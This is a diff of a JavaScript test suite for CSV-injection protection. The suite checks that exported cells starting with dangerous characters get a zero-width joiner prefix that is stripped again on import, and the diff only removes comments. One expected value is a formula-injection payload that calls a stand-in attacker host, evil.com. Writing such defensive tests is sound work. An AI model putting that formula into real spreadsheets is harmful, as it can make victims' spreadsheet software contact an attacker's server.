@@ -65,7 +65,6 @@ describe('csvSecurity', () => {
       const phoneNumber = '+1-555-123-4567';
       const result = sanitizeValueForCSVExport(phoneNumber);
       expect(result).toBe(`${CSV_INJECTION_PREVENTION_ZWJ}+1-555-123-4567`);
-      // Should be visually identical to user
       expect(result.substring(1)).toBe(phoneNumber);
     });
 
@@ -205,7 +204,6 @@ describe('csvSecurity', () => {
 
       japaneseTexts.forEach((text) => {
         const sanitized = sanitizeValueForCSVExport(text);
-        // Should remain unchanged (no dangerous characters at start)
         expect(sanitized).toBe(text);
         expect(containsCSVProtectionZWJ(sanitized)).toBe(false);
       });
@@ -288,11 +286,9 @@ describe('csvSecurity', () => {
         const sanitized = sanitizeValueForCSVExport(text);
         const restored = cleanZWJFromImportedValue(sanitized);
 
-        // Should be sanitized (starts with dangerous character)
         expect(sanitized).toBe(CSV_INJECTION_PREVENTION_ZWJ + text);
         expect(containsCSVProtectionZWJ(sanitized)).toBe(true);
 
-        // Should restore perfectly
         expect(restored).toBe(text);
       });
     });
@@ -309,10 +305,8 @@ describe('csvSecurity', () => {
 
       unicodeTexts.forEach((text) => {
         const sanitized = sanitizeValueForCSVExport(text);
-        // Should remain unchanged (no dangerous ASCII characters at start)
         expect(sanitized).toBe(text);
 
-        // Should not add our protection ZWJ (unless already present in emoji sequences)
         if (!text.includes('\u200D')) {
           expect(containsCSVProtectionZWJ(sanitized)).toBe(false);
         }
@@ -322,7 +316,6 @@ describe('csvSecurity', () => {
 
   describe('CSV import integration', () => {
     it('should work with the mapWorkbook import process', () => {
-      // Simulate data that would come from a CSV export with ZWJ protection
       const exportedData = [
         ['Name', 'Formula', 'Phone'],
         [
@@ -333,14 +326,12 @@ describe('csvSecurity', () => {
         ['Jane Smith', 'Normal text', '+44-20-1234-5678'],
       ];
 
-      // Simulate the import cleanup process
       const cleanedData = exportedData.map((row) =>
         row.map((cell) =>
           typeof cell === 'string' ? cleanZWJFromImportedValue(cell) : cell,
         ),
       );
 
-      // Verify the data is properly restored
       expect(cleanedData).toEqual([
         ['Name', 'Formula', 'Phone'],
         ['John Doe', '=WEBSERVICE("http://evil.com")', '+1-555-123-4567'],
